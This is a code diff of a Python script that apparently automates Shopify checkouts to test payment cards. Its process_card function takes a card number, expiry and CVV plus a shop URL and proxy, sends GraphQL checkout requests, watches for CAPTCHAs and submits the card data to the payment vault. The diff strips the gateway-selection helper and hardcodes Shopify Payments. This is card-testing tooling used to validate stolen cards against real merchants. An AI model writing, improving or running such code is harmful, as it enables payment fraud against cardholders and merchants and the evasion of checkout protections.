@@ -13,9 +13,8 @@ import os
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
 logger = logging.getLogger(__name__)
 
-# ==================== GRAPHQL QUERIES (inline, no .gql files needed) ====================
-
 QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{runningTotal{value{amount currencyCode __typename}__typename}total{value{amount currencyCode __typename}__typename}delivery{__typename ...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle amount{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}}payment{__typename}tax{__typename ...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}__typename}}__typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}"""
+
 QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING
 
 MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){__typename ...on SubmitSuccess{receipt{id __typename}__typename}...on SubmitAlreadyAccepted{receipt{id __typename}__typename}...on SubmittedForCompletion{receipt{id __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage __typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}__typename}}"""
@@ -25,8 +24,6 @@ QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){recei
 logger.info(f"QUERY_PROPOSAL_SHIPPING: {len(QUERY_PROPOSAL_SHIPPING)} chars")
 logger.info(f"MUTATION_SUBMIT: {len(MUTATION_SUBMIT)} chars")
 logger.info(f"QUERY_POLL: {len(QUERY_POLL)} chars")
-
-# ==================== HELPERS ====================
 
 C2C = {"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH"}
 
@@ -246,39 +243,6 @@ def extract_session_token(response_obj, text, unescaped, checkout_url):
             return candidate
     return None
 
-def extract_payment_identifier(seller_proposal):
-    payment_data = seller_proposal.get('payment') if isinstance(seller_proposal, dict) else None
-    if not isinstance(payment_data, dict):
-        return "shopify_payments", "Shopify Payments"
-    lines = payment_data.get('availablePaymentLines') or []
-    skip_types = {
-        'ShopPayWalletConfig', 'ApplePayWalletConfig', 'GooglePayWalletConfig',
-        'FacebookPayWalletConfig', 'ShopifyInstallmentsWalletConfig', 'PaypalWalletConfig',
-        'AmazonPayClassicWalletConfig', 'WalletsPlatformConfiguration',
-        'AnyRedeemablePaymentMethod', 'DeferredPaymentMethod'
-    }
-    priority_keywords = ['shopify_payments', 'stripe', 'braintree', 'adyen', 'card', 'credit']
-    candidates = []
-    for line in lines:
-        if not isinstance(line, dict):
-            continue
-        pm = line.get('paymentMethod')
-        if not isinstance(pm, dict):
-            continue
-        if pm.get('__typename', '') in skip_types:
-            continue
-        pm_id = (pm.get('paymentMethodIdentifier') or pm.get('id') or '').strip()
-        pm_name = (pm.get('extensibilityDisplayName') or pm.get('displayName') or pm.get('name') or pm_id).strip()
-        if pm_id:
-            candidates.append((pm_id, pm_name))
-    if not candidates:
-        return "shopify_payments", "Shopify Payments"
-    for pm_id, pm_name in candidates:
-        for kw in priority_keywords:
-            if kw in pm_id.lower():
-                return pm_id, pm_name
-    return candidates[0]
-
 def safe_parse_json(text, label=""):
     if not text:
         return None, f"Empty response body ({label})"
@@ -289,8 +253,6 @@ def safe_parse_json(text, label=""):
         return parsed, None
     except json.JSONDecodeError as e:
         return None, f"Invalid JSON ({label}): {e} — body: {text[:120].replace(chr(10), ' ')}"
-
-# ==================== MAIN LOGIC ====================
 
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
     gateway = "UNKNOWN"
@@ -548,7 +510,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             tax_data = seller_proposal.get('tax')
             if isinstance(tax_data, dict) and tax_data.get('__typename') == 'FilledTaxTerms':
                 tax_amount = float(safe_get(tax_data, 'totalTaxAmount', 'value', 'amount', default="0") or 0)
-            payment_identifier, gateway = extract_payment_identifier(seller_proposal)
+            payment_identifier = "shopify_payments"
+            gateway = "Shopify Payments"
             total_price = str(round(float(running_total) + shipping_amount + tax_amount, 2))
             dl0 = json_data['variables']['delivery']['deliveryLines'][0]
             dl0['selectedDeliveryStrategy'] = {
@@ -569,14 +532,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             response, resp_text2 = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy)
             if is_captcha_required(resp_text2 or ""):
                 return False, "CAPTCHA_REQUIRED (delivery)", gateway, total_price, currency
-            if resp_text2:
-                d2, _ = safe_parse_json(resp_text2, "delivery")
-                if d2:
-                    d_seller = safe_get(d2, 'data', 'session', 'negotiate', 'result', 'sellerProposal')
-                    if isinstance(d_seller, dict):
-                        upd_id, upd_gw = extract_payment_identifier(d_seller)
-                        if upd_id != "shopify_payments":
-                            payment_identifier, gateway = upd_id, upd_gw
             vault_payload = {
                 "credit_card": {
                     "number": cc, "month": int(mes), "year": int(ano),
